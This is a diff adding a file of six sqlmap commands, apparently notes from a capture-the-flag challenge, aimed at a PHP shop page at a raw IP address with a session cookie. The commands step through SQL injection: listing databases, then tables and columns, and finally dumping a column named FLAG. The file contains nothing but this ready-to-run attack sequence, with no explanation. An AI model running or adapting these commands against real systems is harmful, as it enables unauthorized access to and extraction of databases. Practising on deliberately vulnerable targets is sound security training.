@@ -1,0 +1,11 @@
+sqlmap -u "http://34.89.138.139:30296/index.php" --data="product_name=&submit=Search" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --dbs
+
+sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" -forms -dbs
+
+sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D shop --tables
+
+sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D information_schema --tables
+
+sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D information_schema -T INNODB_SYS_TABLES --columns
+
+sqlmap -u "http://34.89.138.139:30296/index.php" --cookie="PHPSESSID=7092af33b2343365197d77f71d22c407" --forms -D information_schema -T INNODB_SYS_TABLES -C FLAG --dump
